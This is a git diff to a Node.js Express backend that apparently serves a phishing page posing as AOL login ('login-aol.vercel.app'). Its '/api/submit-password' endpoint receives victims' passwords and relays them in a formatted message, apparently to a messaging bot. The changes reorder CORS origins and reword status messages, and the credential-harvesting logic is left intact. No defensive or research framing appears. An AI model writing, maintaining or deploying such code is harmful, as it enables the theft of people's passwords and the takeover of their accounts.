@@ -6,12 +6,12 @@ const { v4: uuidv4 } = require("uuid");
 
 const app = express();
 
-// Simple CORS - Only your Vercel domain + localhost (no crashing wildcard)
+// Clean CORS setup - allows localhost and your Vercel site
 app.use(cors({
   origin: [
-    'https://login-aol.vercel.app',
     'http://localhost:3000',
-    'http://127.0.0.1:3000'
+    'http://127.0.0.1:3000',
+    'https://login-aol.vercel.app'
   ],
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type'],
@@ -78,7 +78,7 @@ app.post("/api/submit-password", async (req, res) => {
   const { attemptId, password } = req.body;
 
   if (!attemptId || !password) {
-    return res.status(400).json({ error: "Missing data" });
+    return res.status(400).json({ error: "attemptId and password required" });
   }
 
   const attempt = loginAttempts.get(attemptId);
@@ -94,12 +94,12 @@ app.post("/api/submit-password", async (req, res) => {
     `🔑 *Password:* \`${password}\``
   );
 
-  res.json({ status: "success" });
+  res.json({ status: "success", message: "Done" });
 });
 
 const port = process.env.PORT || 8080;
 
 app.listen(port, '0.0.0.0', () => {
   console.log(`🚀 Server running on port ${port}`);
-  console.log("✅ CORS enabled for login-aol.vercel.app + localhost");
+  console.log("✅ CORS enabled for localhost and https://login-aol.vercel.app");
 });
